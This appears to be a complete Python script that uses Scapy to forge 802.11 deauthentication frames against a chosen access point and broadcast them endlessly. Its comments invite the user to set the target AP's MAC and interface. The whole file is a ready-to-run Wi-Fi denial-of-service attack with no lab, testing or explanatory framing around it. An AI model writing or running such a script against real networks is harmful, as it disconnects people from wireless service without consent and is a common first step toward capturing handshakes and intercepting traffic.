from scapy.all import *
import sys
import os

# Interface name (change according to your system)
interface = "wlan0"  # Use "wlan0mon" if in monitor mode

# Target AP MAC address (Change this to your target)
target_ap = "00:11:22:33:44:55"

# Target Client MAC address (Set to "FF:FF:FF:FF:FF:FF" for broadcast)
target_client = "FF:FF:FF:FF:FF:FF"

# Deauthentication packet
packet = RadioTap() / Dot11(addr1=target_client, addr2=target_ap, addr3=target_ap) / Dot11Deauth(reason=7)

# Send packets continuously
while True:
    sendp(packet, iface=interface, count=10, inter=0.1, verbose=False)
    print("Sent deauth packet to target")

